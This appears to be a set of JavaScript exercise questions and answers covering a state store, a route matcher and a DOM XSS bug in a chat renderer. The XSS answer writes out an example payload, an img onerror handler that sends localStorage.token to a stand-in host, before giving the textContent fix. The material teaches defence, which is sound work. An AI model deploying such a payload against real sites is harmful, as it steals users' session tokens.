questions.answer:
export function createStore(initial) {
  let state = { ...initial };
  const listeners = new Set();

  return {
    getState: () => state,
    setState(patch) {
      const next = { ...state, ...patch };
      const changed = Object.keys(patch).some((key) => !Object.is(next[key], state[key]));
      if (!changed) return;
      state = next;
      for (const listener of listeners) listener(state);
    },
    subscribe(listener) {
      listeners.add(listener);
      return () => listeners.delete(listener);
    },
  };
}

const store = createStore({ count: 0, name: "Kakade" });
const unsubscribe = store.subscribe((state) => console.log(state));
store.setState({ count: 1 }); // { count: 1, name: 'Kakade' }
store.setState({ count: 1 }); // no log — value unchanged
unsubscribe();
store.setState({ count: 2 }); // no log — unsubscribed

Spreading produces a new object, so subscribers can compare references. The changed check prevents pointless renders, and returning the unsubscribe function from subscribe makes cleanup explicit — the same shape used by many state libraries. A Set avoids duplicate listeners; notification is synchronous, so a listener that calls setState can recurse, which is worth guarding in a larger store.

questions.starter_code:
const routes = [
  { name: "home", pattern: "/" },
  { name: "user", pattern: "/users/:id" },
];

console.log(matchRoute(routes, "/users/42"));
console.log(matchRoute(routes, "/nope"));

questions.answer:
function matchRoute(routes, path) {
  const parts = path.split("/").filter(Boolean);

  for (const route of routes) {
    const pattern = route.pattern.split("/").filter(Boolean);
    if (pattern.length !== parts.length) continue;

    const params = {};
    const ok = pattern.every((segment, i) => {
      if (segment.startsWith(":")) {
        params[segment.slice(1)] = decodeURIComponent(parts[i]);
        return true;
      }
      return segment === parts[i];
    });

    if (ok) return { name: route.name, params };
  }
  return null;
}

console.log(matchRoute(routes, "/users/42"));
// { name: 'user', params: { id: '42' } }
console.log(matchRoute(routes, "/nope"));
// null

Splitting both sides avoids fragile regex concatenation and makes segment count part of the match. Dynamic segments start with ":" and are decoded, so %20 becomes a space. Returning null lets the caller render 404. For real apps, also normalise trailing slashes and decode only once; injecting the param into the page must still go through textContent, never innerHTML.

questions.question:
This chat renderer looks fine. What is the security bug, and what is the fix?

const { user, text } = JSON.parse(event.data);
list.innerHTML += `<li>${user}: ${text}</li>`;

questions.answer:
It is DOM XSS. The message text is concatenated into HTML, so a payload such as <img src=x onerror="fetch('https://evil.example/?t='+localStorage.token)"> becomes a real element and its handler runs with your origin. The user field is equally dangerous. Using += also re-parses the entire list on every message, destroying and recreating existing nodes, which loses listeners and scroll state.

The fix is to build a node and set text:

const li = document.createElement("li");
li.textContent = `${user}: ${text}`;
list.append(li);

If messages must support formatting, sanitize with an allowlist (DOMPurify) and then assign, but plain text is the right default. Never let network data decide the HTML structure.

